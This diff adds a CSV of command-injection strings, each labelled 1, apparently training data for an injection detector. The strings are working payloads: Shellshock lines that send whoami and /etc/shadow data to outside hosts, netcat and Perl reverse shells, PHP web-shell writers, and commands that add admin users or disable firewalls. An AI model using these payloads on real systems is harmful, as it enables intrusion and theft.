@@ -1,0 +1,726 @@
+﻿Sentence,Label
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,1
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,1
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,1
+/index.html|id|,1
+;id;,1
+;id,1
+;netstat -a;,1
+;system('cat%20/etc/passwd'),1
+|id,1
+|/usr/bin/id,1
+|id|,1
+|/usr/bin/id|,1
+||/usr/bin/id|,1
+|id;,1
+||/usr/bin/id;,1
+;id|,1
+;|/usr/bin/id|,1
+\n/bin/ls -al\n,1
+\n/usr/bin/id\n,1
+\nid\n,1
+\n/usr/bin/id;,1
+\nid;,1
+\n/usr/bin/id|,1
+\nid|,1
+;/usr/bin/id\n,1
+;id\n,1
+|usr/bin/id\n,1
+|nid\n,1
+`id`,1
+`/usr/bin/id`,1
+a);id,1
+a;id,1
+a);id;,1
+a;id;,1
+a);id|,1
+a;id|,1
+a)|id,1
+a|id,1
+a)|id;,1
+|/bin/ls -al,1
+a);/usr/bin/id,1
+a;/usr/bin/id,1
+a);/usr/bin/id;,1
+a;/usr/bin/id;,1
+a);/usr/bin/id|,1
+a;/usr/bin/id|,1
+a)|/usr/bin/id,1
+a|/usr/bin/id,1
+a)|/usr/bin/id;,1
+;system('id'),1
+;system('/usr/bin/id'),1
+%0Acat%20/etc/passwd,1
+%0A/usr/bin/id,1
+%0Aid,1
+%0A/usr/bin/id%0A,1
+%0Aid%0A,1
+& ping -i 30 127.0.0.1 &,1
+& ping -n 30 127.0.0.1 &,1
+%0a ping -i 30 127.0.0.1 %0a,1
+`ping 127.0.0.1`,1
+| id,1
+& id,1
+; id,1
+%0a id %0a,1
+$;/usr/bin/id,1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",1
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",1
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",1
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",1
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",1
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",1
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",1
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",1
+cat /etc/hosts,1
+$(`cat /etc/passwd`),1
+cat /etc/passwd,1
+"{{ get_user_file(""/etc/passwd"") }}",1
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->",1
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",1
+"<!--#exec cmd=""/usr/bin/id;-->",1
+system('cat /etc/passwd');,1
+"<?php system(""cat /etc/passwd"");?>",1
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",1
+%20{${phpinfo()}},1
+%20{${sleep(20)}},1
+%20{${sleep(3)}},1
+a|id|,1
+a;id\n,1
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,1
+| curl http://crowdshield.com/.testing/rce.txt,1
+& curl http://crowdshield.com/.testing/rce.txt,1
+; curl https://crowdshield.com/.testing/rce_vuln.txt,1
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,1
+curl https://crowdshield.com/.testing/rce_vuln.txt,1
+" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",1
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",1
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),1
+dir,1
+| dir,1
+; dir,1
+$(`dir`),1
+& dir,1
+&&dir,1
+&& dir,1
+| dir C:\,1
+; dir C:\,1
+& dir C:\,1
+&& dir C:\,1
+dir C:\,1
+| dir C:\Documents and Settings\*,1
+; dir C:\Documents and Settings\*,1
+& dir C:\Documents and Settings\*,1
+&& dir C:\Documents and Settings\*,1
+dir C:\Documents and Settings\*,1
+| dir C:\Users,1
+; dir C:\Users,1
+& dir C:\Users,1
+&& dir C:\Users,1
+dir C:\Users,1
+;echo%20'<script>alert(1)</script>',1
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,1
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",1
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",1
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",1
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",1
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",1
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",1
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+;echo '<script>alert(1)</script>',1
+echo '<script>alert(1)</script>'// XXXXXXXXXXX,1
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,1
+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+() { :;}; echo vulnerable 10,1
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
+eval('ls'),1
+eval('pwd'),1
+eval('pwd');,1
+eval('sleep 5'),1
+eval('sleep 5');,1
+eval('whoami'),1
+eval('whoami');,1
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
+exec('ls'),1
+exec('pwd'),1
+exec('pwd');,1
+exec('sleep 5'),1
+exec('sleep 5');,1
+exec('whoami'),1
+exec('whoami');,1
+";{$_GET[""cmd""]}",1
+&&id,1
+ifconfig,1
+| ifconfig,1
+; ifconfig,1
+& ifconfig,1
+&& ifconfig,1
+ipconfig,1
+| ipconfig /all,1
+; ipconfig /all,1
+& ipconfig /all,1
+&& ipconfig /all,1
+ipconfig /all,1
+ls,1
+$(`ls`),1
+| ls -l /,1
+; ls -l /,1
+& ls -l /,1
+&& ls -l /,1
+ls -l /,1
+| ls -laR /etc,1
+; ls -laR /etc,1
+& ls -laR /etc,1
+&& ls -laR /etc,1
+| ls -laR /var/www,1
+; ls -laR /var/www,1
+& ls -laR /var/www,1
+&& ls -laR /var/www,1
+| ls -l /etc/,1
+; ls -l /etc/,1
+& ls -l /etc/,1
+&& ls -l /etc/,1
+ls -l /etc/,1
+ls -lh /etc/,1
+| ls -l /home/*,1
+; ls -l /home/*,1
+& ls -l /home/*,1
+&& ls -l /home/*,1
+ls -l /home/*,1
+*; ls -lhtR /var/www/,1
+| ls -l /tmp,1
+; ls -l /tmp,1
+& ls -l /tmp,1
+&& ls -l /tmp,1
+ls -l /tmp,1
+| ls -l /var/www/*,1
+; ls -l /var/www/*,1
+& ls -l /var/www/*,1
+&& ls -l /var/www/*,1
+ls -l /var/www/*,1
+\n,1
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,1
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,1
+| nc -lvvp 4444 -e /bin/sh|,1
+; nc -lvvp 4444 -e /bin/sh;,1
+& nc -lvvp 4444 -e /bin/sh&,1
+&& nc -lvvp 4444 -e /bin/sh &,1
+nc -lvvp 4444 -e /bin/sh,1
+nc -lvvp 4445 -e /bin/sh &,1
+nc -lvvp 4446 -e /bin/sh|,1
+nc -lvvp 4447 -e /bin/sh;,1
+nc -lvvp 4448 -e /bin/sh&,1
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,1
+\necho INJECTX\nexit\n\033[2Asleep 5\n,1
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,1
+| net localgroup Administrators hacker /ADD,1
+; net localgroup Administrators hacker /ADD,1
+& net localgroup Administrators hacker /ADD,1
+&& net localgroup Administrators hacker /ADD,1
+net localgroup Administrators hacker /ADD,1
+| netsh firewall set opmode disable,1
+; netsh firewall set opmode disable,1
+& netsh firewall set opmode disable,1
+&& netsh firewall set opmode disable,1
+netsh firewall set opmode disable,1
+netstat,1
+| netstat -an,1
+; netstat -an,1
+& netstat -an,1
+&& netstat -an,1
+netstat -an,1
+| net user hacker Password1 /ADD,1
+; net user hacker Password1 /ADD,1
+& net user hacker Password1 /ADD,1
+&& net user hacker Password1 /ADD,1
+net user hacker Password1 /ADD,1
+| net view,1
+; net view,1
+& net view,1
+&& net view,1
+net view,1
+"perl -e 'print ""X""x1024'",1
+"|| perl -e 'print ""X""x16096'",1
+"| perl -e 'print ""X""x16096'",1
+"; perl -e 'print ""X""x16096'",1
+"& perl -e 'print ""X""x16096'",1
+"&& perl -e 'print ""X""x16096'",1
+"perl -e 'print ""X""x16384'",1
+"; perl -e 'print ""X""x2048'",1
+"& perl -e 'print ""X""x2048'",1
+"&& perl -e 'print ""X""x2048'",1
+"perl -e 'print ""X""x2048'",1
+"|| perl -e 'print ""X""x4096'",1
+"| perl -e 'print ""X""x4096'",1
+"; perl -e 'print ""X""x4096'",1
+"& perl -e 'print ""X""x4096'",1
+"&& perl -e 'print ""X""x4096'",1
+"perl -e 'print ""X""x4096'",1
+"|| perl -e 'print ""X""x8096'",1
+"| perl -e 'print ""X""x8096'",1
+"; perl -e 'print ""X""x8096'",1
+"&& perl -e 'print ""X""x8096'",1
+"perl -e 'print ""X""x8192'",1
+"perl -e 'print ""X""x81920'",1
+|| phpinfo(),1
+| phpinfo(),1
+ {${phpinfo()}},1
+;phpinfo(),1
+;phpinfo();//,1
+';phpinfo();//,1
+{${phpinfo()}},1
+& phpinfo(),1
+&& phpinfo(),1
+phpinfo(),1
+phpinfo();,1
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",1
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",1
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",1
+"<?php system(""sleep 10"");?>",1
+"<?php system(""sleep 5"");?>",1
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",1
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",1
+:phpversion();,1
+;${@print(md5(RCEVulnerable))};,1
+"${@print(""RCEVulnerable"")}",1
+${@print(system($_SERVER['HTTP_USER_AGENT']))},1
+pwd,1
+| pwd,1
+; pwd,1
+& pwd,1
+&& pwd,1
+\r,1
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+\r\n,1
+route,1
+| sleep 1,1
+; sleep 1,1
+& sleep 1,1
+&& sleep 1,1
+sleep 1,1
+|| sleep 10,1
+| sleep 10,1
+; sleep 10,1
+{${sleep(10)}},1
+& sleep 10 ,1
+&& sleep 10,1
+sleep 10,1
+|| sleep 15,1
+| sleep 15,1
+; sleep 15,1
+& sleep 15 ,1
+&& sleep 15,1
+ {${sleep(20)}},1
+{${sleep(20)}},1
+ {${sleep(3)}},1
+{${sleep(3)}},1
+| sleep 5,1
+; sleep 5,1
+& sleep 5,1
+&& sleep 5,1
+sleep 5,1
+ {${sleep(hexdec(dechex(20)))}} ,1
+{${sleep(hexdec(dechex(20)))}} ,1
+sysinfo,1
+| sysinfo,1
+; sysinfo,1
+& sysinfo,1
+&& sysinfo,1
+system('cat C:\boot.ini');,1
+system('cat config.php');,1
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+system('curl https://crowdshield.com/.testing/rce_vuln.txt'),1
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),1
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,1
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
+systeminfo,1
+| systeminfo,1
+; systeminfo,1
+& systeminfo,1
+&& systeminfo,1
+system('ls'),1
+system('pwd'),1
+system('pwd');,1
+|| system('sleep 5');,1
+| system('sleep 5');,1
+; system('sleep 5');,1
+& system('sleep 5');,1
+&& system('sleep 5');,1
+system('sleep 5'),1
+system('sleep 5');,1
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),1
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,1
+system('whoami'),1
+system('whoami');,1
+test*; ls -lhtR /var/www/,1
+"test* || perl -e 'print ""X""x16096'",1
+"test* | perl -e 'print ""X""x16096'",1
+"test* & perl -e 'print ""X""x16096'",1
+"test* && perl -e 'print ""X""x16096'",1
+"test*; perl -e 'print ""X""x16096'",1
+$(`type C:\boot.ini`),1
+&&type C:\\boot.ini,1
+| type C:\Windows\repair\SAM,1
+; type C:\Windows\repair\SAM,1
+& type C:\Windows\repair\SAM,1
